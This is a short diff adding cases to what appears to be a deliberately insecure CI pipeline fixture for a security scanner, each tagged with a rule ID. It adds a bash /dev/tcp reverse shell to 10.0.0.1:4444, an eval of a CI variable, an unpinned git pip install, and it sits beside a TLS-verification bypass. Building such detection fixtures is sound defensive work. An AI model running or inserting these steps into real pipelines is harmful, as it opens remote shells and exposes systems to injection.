@@ -72,5 +72,11 @@ insecure-setup:
     - npm install
     # GL-022: dependency update bypasses lockfile pins.
     - npm update
+    # GL-025: evidence of malicious activity — bash /dev/tcp reverse shell.
+    - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
     # GL-023: TLS verification bypass.
     - git config --global http.sslVerify false
+    # GL-026: dangerous shell idiom — eval re-parses the value as shell.
+    - eval "$CI_CUSTOM_CMD"
+    # GL-027: pip install from an unpinned git URL.
+    - pip install git+https://example.com/internal/helper.git
